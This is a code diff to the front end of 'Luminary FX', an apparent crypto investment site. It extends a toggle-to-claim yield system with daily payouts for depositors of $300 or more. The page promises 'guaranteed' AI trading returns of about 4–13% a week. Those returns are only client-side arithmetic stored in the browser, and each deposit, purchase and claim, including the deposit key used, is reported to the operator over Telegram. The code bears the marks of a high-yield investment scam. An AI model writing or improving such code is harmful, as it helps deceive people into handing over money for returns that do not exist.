@@ -832,7 +832,7 @@
                 <li class="nav-link active" onclick="switchMainTab('dashboard', this)"><i class="fa-solid fa-chart-pie"></i> Executive Home</li>
                 <li class="nav-link" onclick="switchMainTab('games', this)"><i class="fa-solid fa-rocket"></i> Dollar Crash Game</li>
                 <li class="nav-link" onclick="switchMainTab('packages', this)"><i class="fa-solid fa-gem"></i> Investment Tiers</li>
-                <li class="nav-link" onclick="switchMainTab('claims', this)"><i class="fa-solid fa-toggle-on"></i> Weekly Claims</li>
+                <li class="nav-link" onclick="switchMainTab('claims', this)"><i class="fa-solid fa-toggle-on"></i> Daily/Weekly Claims</li>
                 <li class="nav-link" onclick="switchMainTab('profile', this)"><i class="fa-solid fa-id-card"></i> My Profile</li>
                 <li class="nav-link" onclick="switchMainTab('support', this)"><i class="fa-solid fa-headset"></i> Contact Support</li>
                 <li class="nav-link" onclick="switchMainTab('transactions', this)"><i class="fa-solid fa-list-check"></i> Transactions Log</li>
@@ -847,7 +847,7 @@
                     <div class="hero-tag"><i class="fa-solid fa-bolt"></i> High-Yield Wealth Accelerator</div>
                     <h1 class="hero-title">Unlock Unmatched Weekly Returns with Luminary FX Institutional Trading</h1>
                     <p class="hero-sub">
-                        Empower your financial future with our AI-driven quantitative algorithm. Guarantee steady cash flow, weekly profit harvesting, and instant automated payouts directly to your crypto wallet.
+                        Empower your financial future with our AI-driven quantitative algorithm. Guarantee steady cash flow, yield profit harvesting, and instant automated payouts directly to your crypto wallet.
                     </p>
                     <div style="display: flex; gap: 14px; flex-wrap: wrap;">
                         <button class="btn btn-gold" style="width: auto; padding: 12px 28px;" onclick="switchMainTab('packages', document.querySelectorAll('.nav-link')[2])">
@@ -923,8 +923,8 @@
                             <i class="fa-solid fa-sliders"></i>
                         </div>
                         <div>
-                            <h3 style="font-size: 18px; font-weight: 800; color: var(--text-main); margin-bottom: 4px;">Weekly Quantitative Trading Yield Switch</h3>
-                            <p style="font-size: 13px; color: var(--text-muted);">Toggle this switch every 7 days to enable AI High-Frequency weekly yield harvesting into your pending balance.</p>
+                            <h3 style="font-size: 18px; font-weight: 800; color: var(--text-main); margin-bottom: 4px;">Quantitative Trading Yield Switch</h3>
+                            <p style="font-size: 13px; color: var(--text-muted);" id="yieldDescText">Toggle this switch to harvest AI High-Frequency yield into your pending profit balance.</p>
                         </div>
                     </div>
                     <div style="display: flex; align-items: center; gap: 14px;">
@@ -1086,15 +1086,15 @@
             <!-- VIEW 3: PACKAGES -->
             <div id="packages" class="page-view">
                 <h2 style="margin-bottom: 8px;">Institutional Investment Categories</h2>
-                <p style="color: var(--text-muted); margin-bottom: 20px;">Choose your strategy: Weekly Yield Plans ($20 - $2,500). <strong>(Up to 2 Active Plans Allowed Simultaneously)</strong></p>
+                <p style="color: var(--text-muted); margin-bottom: 20px;">Choose your strategy: Yield Plans ($20 - $2,500). <strong>(Up to 2 Active Plans Allowed Simultaneously)</strong></p>
 
                 <div class="packages-grid" id="packagesContainer"></div>
             </div>
 
-            <!-- VIEW 4: WEEKLY CLAIMS -->
+            <!-- VIEW 4: WEEKLY / DAILY CLAIMS -->
             <div id="claims" class="page-view">
-                <h2 style="margin-bottom: 8px;">Weekly Claims & Switch Tick</h2>
-                <p style="color: var(--text-muted); margin-bottom: 20px;">Toggle the switch button every 7 days to credit active weekly rewards to your balance.</p>
+                <h2 style="margin-bottom: 8px;">Yield Claims & Switch Tick</h2>
+                <p style="color: var(--text-muted); margin-bottom: 20px;">Toggle the switch button to credit active yield rewards to your balance. ($300+ Depositors enjoy Daily Yield distribution!)</p>
                 <div class="stat-card" style="overflow-x: auto;">
                     <table>
                         <thead>
@@ -1104,7 +1104,7 @@
                                 <th>Investment</th>
                                 <th>Expected Yield</th>
                                 <th>Min Withdrawal</th>
-                                <th style="text-align: center;">Weekly Claim Toggle</th>
+                                <th style="text-align: center;">Claim Status Toggle</th>
                             </tr>
                         </thead>
                         <tbody id="claimsTableBody"></tbody>
@@ -1408,9 +1408,9 @@
             { id: 1, category: "weekly", name: "Starter Weekly Plan", price: 20, returnLabel: "+$2.60 / Week", weeklyVal: 2.60, minWithdraw: 50, icon: "fa-seedling", badge: "Weekly Starter" },
             { id: 2, category: "weekly", name: "Bronze Weekly Plan", price: 100, returnLabel: "+$9.00 / Week", weeklyVal: 9.00, minWithdraw: 50, icon: "fa-coins", badge: "Weekly Popular" },
             { id: 3, category: "weekly", name: "Silver Weekly Plan", price: 250, returnLabel: "+$30.00 / Week", weeklyVal: 30.00, minWithdraw: 50, icon: "fa-award", badge: "Weekly Standard" },
-            { id: 4, category: "weekly", name: "Gold Weekly Plan", price: 500, returnLabel: "+$60.00 / Week", weeklyVal: 60.00, minWithdraw: 50, icon: "fa-crown", badge: "Weekly High Return" },
-            { id: 5, category: "weekly", name: "Weekly Pro Plan", price: 1000, returnLabel: "+$80.00 / Week", weeklyVal: 80.00, minWithdraw: 50, icon: "fa-gem", badge: "Weekly Pro" },
-            { id: 6, category: "weekly", name: "Weekly Diamond Plan", price: 2500, returnLabel: "+$100.00 / Week", weeklyVal: 100.00, minWithdraw: 50, icon: "fa-diamond", badge: "Weekly Max" }
+            { id: 4, category: "weekly", name: "Gold Plan", price: 500, returnLabel: "+$60.00 / Week ($8.57/Day)", weeklyVal: 60.00, minWithdraw: 50, icon: "fa-crown", badge: "VIP High Return" },
+            { id: 5, category: "weekly", name: "Pro Plan", price: 1000, returnLabel: "+$80.00 / Week ($11.43/Day)", weeklyVal: 80.00, minWithdraw: 50, icon: "fa-gem", badge: "VIP Pro" },
+            { id: 6, category: "weekly", name: "Diamond Plan", price: 2500, returnLabel: "+$100.00 / Week ($14.28/Day)", weeklyVal: 100.00, minWithdraw: 50, icon: "fa-diamond", badge: "VIP Max" }
         ];
 
         let systemDB = JSON.parse(localStorage.getItem('luminary_fx_system_db')) || {
@@ -1628,6 +1628,7 @@
 
             saveSystemDB();
             updateUI();
+            checkWeeklyClaimStatus(); // Re-evaluate daily/weekly interval status on deposit increase
 
             sendTelegramNotification(`<b>🔑 Key Deposit Successful!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amount.toFixed(2)}\n<b>Key Used:</b> <code>${inputKey}</code>\n<b>New Deposit Balance:</b> $${currentUserData.deposit.toFixed(2)}`);
 
@@ -2007,7 +2008,7 @@
                     <div class="pkg-price">$${pkg.price.toFixed(2)}</div>
                     
                     <div style="margin-bottom: 20px;">
-                        <div class="pkg-feature"><span>Category</span><strong>Weekly Yield</strong></div>
+                        <div class="pkg-feature"><span>Category</span><strong>Yield Plan</strong></div>
                         <div class="pkg-feature"><span>Expected Return</span><strong style="color: var(--accent-green);">${pkg.returnLabel}</strong></div>
                         <div class="pkg-feature"><span>Min Withdrawal</span><strong>$50.00</strong></div>
                         <div class="pkg-feature"><span>Plan Duration</span><strong>30 Days</strong></div>
@@ -2059,54 +2060,73 @@
 
             sendTelegramNotification(`<b>🚀 New Investment Plan Activated!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Plan Name:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price.toFixed(2)}\n<b>Weekly Yield:</b> $${pkg.weeklyVal.toFixed(2)}\n<b>Active Plans:</b> ${currentUserData.activePlans.length} / 2`);
 
-            alert(`Package Purchased Successfully!\n\n${pkg.name} is now active (${currentUserData.activePlans.length}/2 Active Plans). You can claim weekly returns of $${pkg.weeklyVal.toFixed(2)} every 7 days.`);
+            alert(`Package Purchased Successfully!\n\n${pkg.name} is now active (${currentUserData.activePlans.length}/2 Active Plans).`);
         }
 
         function renderClaimsTable() {
             const tbody = document.getElementById('claimsTableBody');
             if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">No Active Investment Plans Found. Purchase a plan to enable weekly claims.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">No Active Investment Plans Found. Purchase a plan to enable yield claims.</td></tr>`;
                 return;
             }
 
-            tbody.innerHTML = currentUserData.activePlans.map(plan => `
+            const isHighDepositUser = currentUserData.deposit >= 300.00;
+
+            tbody.innerHTML = currentUserData.activePlans.map(plan => {
+                const yieldText = isHighDepositUser 
+                    ? `+$${(plan.weeklyVal / 7).toFixed(2)} / Day` 
+                    : `+$${plan.weeklyVal.toFixed(2)} / Week`;
+                
+                return `
                 <tr>
                     <td><strong>${plan.name}</strong></td>
-                    <td><span style="color: var(--accent-gold); font-weight: 700;">Weekly Plan</span></td>
+                    <td><span style="color: var(--accent-gold); font-weight: 700;">${isHighDepositUser ? 'Daily VIP Yield' : 'Weekly Plan'}</span></td>
                     <td>$${plan.price.toFixed(2)}</td>
-                    <td style="color: var(--accent-green); font-weight: 700;">+$${plan.weeklyVal.toFixed(2)} / Week</td>
+                    <td style="color: var(--accent-green); font-weight: 700;">${yieldText}</td>
                     <td>$50.00</td>
                     <td style="text-align: center;">
-                        <span style="font-size: 12px; font-weight: 700; color: var(--accent-green);">AUTOMATED WEEKLY TICK ENABLED</span>
+                        <span style="font-size: 12px; font-weight: 700; color: var(--accent-green);">
+                            ${isHighDepositUser ? 'DAILY YIELD TICK ACTIVE' : 'WEEKLY TICK ENABLED'}
+                        </span>
                     </td>
                 </tr>
-            `).join('');
+            `}).join('');
         }
 
+        /* --- UPDATED CLAIM INTERVAL CHECK ($300+ DEPOSITORS GET DAILY - 24H CLAIM) --- */
         function checkWeeklyClaimStatus() {
             const toggle = document.getElementById('homeYieldToggle');
             const statusText = document.getElementById('switchStatusText');
+            const descText = document.getElementById('yieldDescText');
 
             if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) {
                 toggle.checked = false;
                 toggle.disabled = true;
                 statusText.innerText = "NO ACTIVE PLAN FOUND";
                 statusText.style.color = "var(--accent-red)";
+                if(descText) descText.innerText = "Toggle this switch to harvest AI High-Frequency yield into your pending profit balance.";
                 return;
+            }
+
+            const isHighDepositUser = currentUserData.deposit >= 300.00;
+            const targetIntervalMs = isHighDepositUser ? (24 * 60 * 60 * 1000) : (7 * 24 * 60 * 60 * 1000);
+
+            if(descText) {
+                descText.innerText = isHighDepositUser 
+                    ? "VIP Depositor Status ($300+): Toggle this switch every 24 Hours to harvest your DAILY quantitative trading returns." 
+                    : "Toggle this switch every 7 days to enable AI High-Frequency weekly yield harvesting into your pending balance.";
             }
 
             let canClaimAny = false;
             let minRemainingMs = Infinity;
 
-            const sevenDaysMs = 7 * 24 * 60 * 60 * 1000;
-
             currentUserData.activePlans.forEach(plan => {
                 const lastClaim = plan.lastClaimDate || plan.startDate;
                 const elapsedMs = Date.now() - lastClaim;
-                if (elapsedMs >= sevenDaysMs) {
+                if (elapsedMs >= targetIntervalMs) {
                     canClaimAny = true;
                 } else {
-                    const rem = sevenDaysMs - elapsedMs;
+                    const rem = targetIntervalMs - elapsedMs;
                     if (rem < minRemainingMs) minRemainingMs = rem;
                 }
             });
@@ -2114,28 +2134,38 @@
             if (canClaimAny) {
                 toggle.disabled = false;
                 toggle.checked = false;
-                statusText.innerText = "WEEKLY YIELD READY TO CLAIM!";
+                statusText.innerText = isHighDepositUser ? "DAILY YIELD READY TO CLAIM!" : "WEEKLY YIELD READY TO CLAIM!";
                 statusText.style.color = "var(--accent-green)";
             } else {
                 toggle.disabled = true;
                 toggle.checked = true;
-                const daysLeft = Math.ceil(minRemainingMs / (24 * 60 * 60 * 1000));
-                statusText.innerText = `YIELD ACTIVE (${daysLeft} DAYS TO NEXT CLAIM)`;
+                
+                if (isHighDepositUser) {
+                    const hoursLeft = Math.ceil(minRemainingMs / (60 * 60 * 1000));
+                    statusText.innerText = `DAILY YIELD ACTIVE (${hoursLeft} HOURS TO NEXT CLAIM)`;
+                } else {
+                    const daysLeft = Math.ceil(minRemainingMs / (24 * 60 * 60 * 1000));
+                    statusText.innerText = `YIELD ACTIVE (${daysLeft} DAYS TO NEXT CLAIM)`;
+                }
                 statusText.style.color = "var(--accent-gold)";
             }
         }
 
+        /* --- UPDATED HOME YIELD TOGGLE FOR DAILY & WEEKLY HARVESTING --- */
         function toggleHomeYield(toggleElem) {
             if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) return;
 
-            const sevenDaysMs = 7 * 24 * 60 * 60 * 1000;
+            const isHighDepositUser = currentUserData.deposit >= 300.00;
+            const targetIntervalMs = isHighDepositUser ? (24 * 60 * 60 * 1000) : (7 * 24 * 60 * 60 * 1000);
+
             let totalClaimed = 0;
             let claimedPlanNames = [];
 
             currentUserData.activePlans.forEach(plan => {
                 const lastClaim = plan.lastClaimDate || plan.startDate;
-                if (Date.now() - lastClaim >= sevenDaysMs) {
-                    totalClaimed += plan.weeklyVal;
+                if (Date.now() - lastClaim >= targetIntervalMs) {
+                    const yieldVal = isHighDepositUser ? (plan.weeklyVal / 7) : plan.weeklyVal;
+                    totalClaimed += yieldVal;
                     plan.lastClaimDate = Date.now();
                     claimedPlanNames.push(plan.name);
                 }
@@ -2144,24 +2174,33 @@
             if (totalClaimed > 0) {
                 currentUserData.pending += totalClaimed;
 
-                addTx(`Weekly Claim Yield (${claimedPlanNames.join(', ')})`, `+$${totalClaimed.toFixed(2)}`, "Pending Wallet");
+                const claimLabel = isHighDepositUser ? "Daily VIP Yield Claim" : "Weekly Claim Yield";
+                addTx(`${claimLabel} (${claimedPlanNames.join(', ')})`, `+$${totalClaimed.toFixed(2)}`, "Pending Wallet");
 
                 saveSystemDB();
                 updateUI();
                 checkWeeklyClaimStatus();
 
-                sendTelegramNotification(`<b>💰 Weekly Yield Claimed!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Plans:</b> ${claimedPlanNames.join(', ')}\n<b>Total Yield:</b> $${totalClaimed.toFixed(2)}\n<b>New Pending Balance:</b> $${currentUserData.pending.toFixed(2)}`);
+                sendTelegramNotification(`<b>💰 ${isHighDepositUser ? 'Daily' : 'Weekly'} Yield Claimed!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Plans:</b> ${claimedPlanNames.join(', ')}\n<b>Total Yield:</b> $${totalClaimed.toFixed(2)}\n<b>New Pending Balance:</b> $${currentUserData.pending.toFixed(2)}`);
 
-                alert(`Weekly Yield Claimed!\n\n+$${totalClaimed.toFixed(2)} from active plan(s) has been added to your Pending Profit Wallet.`);
+                alert(`${isHighDepositUser ? 'Daily' : 'Weekly'} Yield Claimed!\n\n+$${totalClaimed.toFixed(2)} from active plan(s) has been added to your Pending Profit Wallet.`);
             } else {
-                alert('No plans are currently eligible for a weekly claim.');
+                alert('No plans are currently eligible for a yield claim.');
                 checkWeeklyClaimStatus();
             }
         }
 
+        /* --- UPDATED PENDING TO AVAILABLE TRANSFER RULE ($300+ DEPOSITORS MUST HAVE $5 MINIMUM) --- */
         function transferPendingToAvailable() {
             if (currentUserData.pending <= 0) {
                 alert('Your Pending Profit Wallet is empty! No funds to transfer.');
+                return;
+            }
+
+            const isHighDepositUser = currentUserData.deposit >= 300.00;
+
+            if (isHighDepositUser && currentUserData.pending < 5.00) {
+                alert(`VIP Pending Wallet Rule!\n\nFor accounts with deposits over $300, you must have at least $5.00 in your Pending Profit Wallet to transfer it to your Available Balance.\n\nCurrent Pending Balance: $${currentUserData.pending.toFixed(2)}`);
                 return;
             }
 
